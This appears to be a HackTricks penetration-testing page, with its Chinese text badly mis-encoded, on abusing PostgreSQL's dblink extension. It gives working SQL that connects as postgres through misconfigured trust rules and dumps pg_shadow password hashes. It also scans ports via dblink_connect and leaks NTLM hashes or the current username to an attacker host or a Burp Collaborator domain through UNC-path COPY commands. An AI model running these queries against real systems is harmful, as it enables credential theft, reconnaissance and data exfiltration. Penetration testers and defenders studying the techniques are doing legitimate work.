{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}


**åœ¨åŸå§‹è®ºæ–‡ä¸­æ‰¾åˆ°[æ›´å¤šå…³äºè¿™äº›æ”»å‡»çš„ä¿¡æ¯](http://www.leidecker.info/pgshell/Having\_Fun\_With\_PostgreSQL.txt)**ã€‚

è‡ª **PostgreSQL 9.1** ä»¥æ¥ï¼Œå®‰è£…é¢å¤–æ¨¡å—å˜å¾—ç®€å•ã€‚å¯ä»¥ä½¿ç”¨ [`CREATE EXTENSION`](https://www.postgresql.org/docs/current/sql-createextension.html) å®‰è£… [æ³¨å†Œæ‰©å±•å¦‚ `dblink`](https://www.postgresql.org/docs/current/contrib.html)ï¼š
```sql
CREATE EXTENSION dblink;
```
ä¸€æ—¦ä½ åŠ è½½äº† dblinkï¼Œä½ å°±å¯ä»¥æ‰§è¡Œä¸€äº›æœ‰è¶£çš„æŠ€å·§ï¼š

## æƒé™æå‡

æ–‡ä»¶ `pg_hba.conf` å¯èƒ½é…ç½®ä¸å½“ **å…è®¸ä» localhost ä»¥ä»»ä½•ç”¨æˆ·èº«ä»½è¿æ¥** è€Œæ— éœ€çŸ¥é“å¯†ç ã€‚è¿™ä¸ªæ–‡ä»¶é€šå¸¸å¯ä»¥åœ¨ `/etc/postgresql/12/main/pg_hba.conf` ä¸­æ‰¾åˆ°ï¼Œé”™è¯¯çš„é…ç½®çœ‹èµ·æ¥åƒï¼š
```
local    all    all    trust
```
_è¯·æ³¨æ„ï¼Œè¿™ç§é…ç½®é€šå¸¸ç”¨äºåœ¨ç®¡ç†å‘˜å¿˜è®°æ•°æ®åº“ç”¨æˆ·å¯†ç æ—¶ä¿®æ”¹å¯†ç ï¼Œå› æ­¤æœ‰æ—¶æ‚¨å¯èƒ½ä¼šæ‰¾åˆ°å®ƒã€‚_\
_è¿˜è¦æ³¨æ„ï¼Œæ–‡ä»¶ pg\_hba.conf ä»…å¯ç”± postgres ç”¨æˆ·å’Œç»„è¯»å–ï¼Œå¹¶ä¸”ä»…å¯ç”± postgres ç”¨æˆ·å†™å…¥ã€‚_

è¿™ç§æƒ…å†µæ˜¯ **æœ‰ç”¨çš„ï¼Œå¦‚æœ** ä½  **å·²ç»** åœ¨å—å®³è€…çš„ **shell** ä¸­ï¼Œå› ä¸ºå®ƒå°†å…è®¸ä½ è¿æ¥åˆ° postgresql æ•°æ®åº“ã€‚

å¦ä¸€ä¸ªå¯èƒ½çš„é”™è¯¯é…ç½®ç±»ä¼¼äºï¼š
```
host    all     all     127.0.0.1/32    trust
```
å› ä¸ºå®ƒå°†å…è®¸æ¥è‡ªæœ¬åœ°ä¸»æœºçš„æ¯ä¸ªäººä»¥ä»»ä½•ç”¨æˆ·èº«ä»½è¿æ¥åˆ°æ•°æ®åº“ã€‚\
åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœ**`dblink`**å‡½æ•°**æ­£å¸¸å·¥ä½œ**ï¼Œæ‚¨å¯ä»¥é€šè¿‡é€šè¿‡å·²å»ºç«‹çš„è¿æ¥è¿æ¥åˆ°æ•°æ®åº“æ¥**æå‡æƒé™**ï¼Œå¹¶è®¿é—®ä¸åº”è¯¥èƒ½å¤Ÿè®¿é—®çš„æ•°æ®ï¼š
```sql
SELECT * FROM dblink('host=127.0.0.1
user=postgres
dbname=postgres',
'SELECT datname FROM pg_database')
RETURNS (result TEXT);

SELECT * FROM dblink('host=127.0.0.1
user=postgres
dbname=postgres',
'select usename, passwd from pg_shadow')
RETURNS (result1 TEXT, result2 TEXT);
```
## Port Scanning

é€šè¿‡æ»¥ç”¨ `dblink_connect`ï¼Œæ‚¨è¿˜å¯ä»¥**æœç´¢å¼€æ”¾ç«¯å£**ã€‚å¦‚æœè¯¥**å‡½æ•°ä¸èµ·ä½œç”¨ï¼Œæ‚¨åº”è¯¥å°è¯•ä½¿ç”¨ `dblink_connect_u()`ï¼Œå› ä¸ºæ–‡æ¡£è¯´æ˜ `dblink_connect_u()` ä¸ `dblink_connect()` ç›¸åŒï¼Œåªæ˜¯å®ƒå…è®¸éè¶…çº§ç”¨æˆ·ä½¿ç”¨ä»»ä½•èº«ä»½éªŒè¯æ–¹æ³•è¿›è¡Œè¿æ¥ã€‚**
```sql
SELECT * FROM dblink_connect('host=216.58.212.238
port=443
user=name
password=secret
dbname=abc
connect_timeout=10');
//Different response
// Port closed
RROR:  could not establish connection
DETAIL:  could not connect to server: Connection refused
Is the server running on host "127.0.0.1" and accepting
TCP/IP connections on port 4444?

// Port Filtered/Timeout
ERROR:  could not establish connection
DETAIL:  timeout expired

// Accessing HTTP server
ERROR:  could not establish connection
DETAIL:  timeout expired

// Accessing HTTPS server
ERROR:  could not establish connection
DETAIL:  received invalid response to SSL negotiation:
```
æ³¨æ„ï¼Œåœ¨èƒ½å¤Ÿä½¿ç”¨ `dblink_connect` æˆ– `dblink_connect_u` ä¹‹å‰ï¼Œæ‚¨å¯èƒ½éœ€è¦æ‰§è¡Œï¼š
```
CREATE extension dblink;
```
## UNC è·¯å¾„ - NTLM å“ˆå¸Œæ³„éœ²
```sql
-- can be used to leak hashes to Responder/equivalent
CREATE TABLE test();
COPY test FROM E'\\\\attacker-machine\\footestbar.txt';
```

```sql
-- to extract the value of user and send it to Burp Collaborator
CREATE TABLE test(retval text);
CREATE OR REPLACE FUNCTION testfunc() RETURNS VOID AS $$
DECLARE sqlstring TEXT;
DECLARE userval TEXT;
BEGIN
SELECT INTO userval (SELECT user);
sqlstring := E'COPY test(retval) FROM E\'\\\\\\\\'||userval||E'.xxxx.burpcollaborator.net\\\\test.txt\'';
EXECUTE sqlstring;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;
SELECT testfunc();
```
{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
